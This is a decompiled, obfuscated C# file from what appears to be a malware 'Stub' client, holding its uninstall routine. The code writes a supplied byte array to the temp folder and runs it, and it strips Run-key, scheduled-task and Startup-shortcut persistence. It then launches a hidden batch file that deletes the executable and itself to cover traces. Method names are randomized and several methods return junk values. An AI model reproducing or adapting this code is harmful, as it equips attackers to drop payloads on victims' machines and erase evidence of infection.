using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub;

public class MSDSI6yxW2wImQ5Bk57rCKms4yJIEqOGbqJ9C6I97HRl
{
	public static void OTUu84wpWW4pq87LvVI2jdelwJnqiCrduHfXXl9EdRWc(bool IXtNJyPNwwpUoNDMgfXbRuvWFFdnBa8a7tEK6tp7b23H, string UBgihdckChfWfvo7vtIcBq8kfwZ3ZNoovKMuPMawhcpN, byte[] lYYG4RMEf2Egk4qlo7cC1PoouJI7F0PhVeLwv7qFefCf)
	{
		if (IXtNJyPNwwpUoNDMgfXbRuvWFFdnBa8a7tEK6tp7b23H)
		{
			try
			{
				UBgihdckChfWfvo7vtIcBq8kfwZ3ZNoovKMuPMawhcpN = Path.Combine(Path.GetTempPath(), qAySVw7iIJbFXva0BV84CUpJ8atpj.Fyq6CSLxtHVuwJoPVARGZ2l2ePigO(6) + UBgihdckChfWfvo7vtIcBq8kfwZ3ZNoovKMuPMawhcpN);
				File.WriteAllBytes(UBgihdckChfWfvo7vtIcBq8kfwZ3ZNoovKMuPMawhcpN, lYYG4RMEf2Egk4qlo7cC1PoouJI7F0PhVeLwv7qFefCf);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			File.Delete(LLQqOMuku02a3eSHe7KxkMgL5QsXp0CTkIoG4QmrIXrV.mSDxi0ie2cud9MciXsqbbGBxSFR7dyzLFBKAplWT6vmQ + "\\" + Path.GetFileName(qAySVw7iIJbFXva0BV84CUpJ8atpj.string_0));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.DeleteValue(Path.GetFileNameWithoutExtension(qAySVw7iIJbFXva0BV84CUpJ8atpj.string_0), throwOnMissingValue: false);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "schtasks";
			processStartInfo.Arguments = "/delete /f  /tn \"" + Path.GetFileNameWithoutExtension(qAySVw7iIJbFXva0BV84CUpJ8atpj.string_0) + "\"";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			Process.Start(processStartInfo);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileNameWithoutExtension(qAySVw7iIJbFXva0BV84CUpJ8atpj.string_0) + ".lnk";
			if (File.Exists(path))
			{
				qAySVw7iIJbFXva0BV84CUpJ8atpj.fileStream_0.Close();
				File.Delete(path);
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		GClass1.BOM8wdTRRE8PJ0qiBkhvG9TP4sy9M();
		try
		{
			string text = Path.GetTempFileName() + ".bat";
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("timeout 3 > NUL");
				streamWriter.WriteLine("CD " + Application.get_StartupPath());
				streamWriter.WriteLine("DEL \"" + Path.GetFileName(Application.get_ExecutablePath()) + "\" /f /q");
				streamWriter.WriteLine("CD " + Path.GetTempPath());
				streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
			}
			if (IXtNJyPNwwpUoNDMgfXbRuvWFFdnBa8a7tEK6tp7b23H)
			{
				try
				{
					Process.Start(UBgihdckChfWfvo7vtIcBq8kfwZ3ZNoovKMuPMawhcpN);
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = text;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.ErrorDialog = false;
			processStartInfo.UseShellExecute = false;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
			Environment.Exit(0);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	public static string N8fIy6kyXjxlwF1TTFA23lTDTuPpBuxwjEFeTYIZyyXwMqir8EtQqa8Xt1JxsRfuLOoXEOarkcNb3aI()
	{
		return "3Gy1PElTCZqAhG6hlyK87xUTewFseRzlB50NQsS2G3PZ8b1h2eeWlHsqxeeXiYbeXZZRsHQlbEqMX3F";
	}

	public static int smethod_0()
	{
		return 44972962;
	}

	public static string Exitubh0gtIHMr98juetPOEfdoKqfKR1YHTHBbjo1ut96oUsf9R9SM4EzoyST8aqJbSutxvaIAHn1ej()
	{
		return "FJlDiaslWMyrAKFcMp51DgZ68olOEjnpa9aUQAlks5IbY9vmgOGGaegbsUsZ5g8t49YibXtfZDpxrzF";
	}

	public static int TILtuvgKI8npE7sQq5teZP5GPjtf1voxAV6JpSiC6Ly8AKsGAKwboi95iFSzd1eECvrGuxCl4p9Dd91()
	{
		return 24866858;
	}
}
